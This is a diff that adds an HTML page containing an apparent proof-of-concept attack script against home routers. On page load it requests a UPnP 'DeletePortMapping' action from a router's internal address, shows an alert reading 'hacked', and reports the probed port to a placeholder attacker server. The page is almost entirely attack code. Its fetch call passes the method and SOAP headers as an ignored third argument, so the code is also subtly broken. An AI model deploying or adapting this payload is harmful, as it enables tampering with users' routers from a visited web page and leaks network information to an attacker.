@@ -1,0 +1,19 @@
+<html>
+<head></head>
+<body>
+	<script>
+	
+	function sendPort(attackerServer, openHTTPPort) {
+		
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', attackerServer, true);
+			
+		// Send the GET request
+		xhr.send(openHTTPPort);		
+	}
+	
+	var checkUPnPServer = 'http://[ROUTER_INTERNAL_URL]:[PORT_TO_CHECK]';
+	fetch(checkUPnPServer, {'mode':'no-cors'}, {  method: 'POST',  body: "",  headers:{'Content-Type': 'text/xml','SOAPAction': '"urn:schemas-upnp-org:service:WANPPPConnection:1#DeletePortMapping"'  }}).then(function (response) {alert("hacked");sendPort("[ATTACKER_SERVER]", "[PORT_TO_CHECK]")}).catch(function (response) {})
+	</script>
+</body>
+</html>
